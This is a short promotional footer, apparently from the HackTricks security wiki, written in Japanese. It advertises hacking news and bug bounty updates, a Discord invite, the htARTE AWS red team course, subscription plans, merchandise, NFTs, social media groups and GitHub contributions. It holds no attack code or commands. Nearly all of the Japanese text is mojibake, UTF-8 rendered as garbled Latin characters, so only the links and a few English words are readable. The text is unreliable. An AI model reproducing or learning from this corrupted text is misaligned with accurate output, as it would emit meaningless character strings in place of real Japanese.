ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’æœ€æ–°ã®çŠ¶æ…‹ã§æŠŠæ¡ã—ã¾ã—ã‚‡ã†

**æœ€æ–°ã®ã‚¢ãƒŠã‚¦ãƒ³ã‚¹ãƒ¡ãƒ³ãƒˆ**\
æœ€æ–°ã®ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¾ã—ã‚‡ã†

**[Discord](https://discord.com/invite/N3FrSbmwdy)** ã«å‚åŠ ã—ã¦ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã—ã¾ã—ã‚‡ã†ï¼

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã³ã¾ã—ã‚‡ã†ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹
* **HackTricks** ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹

</details>
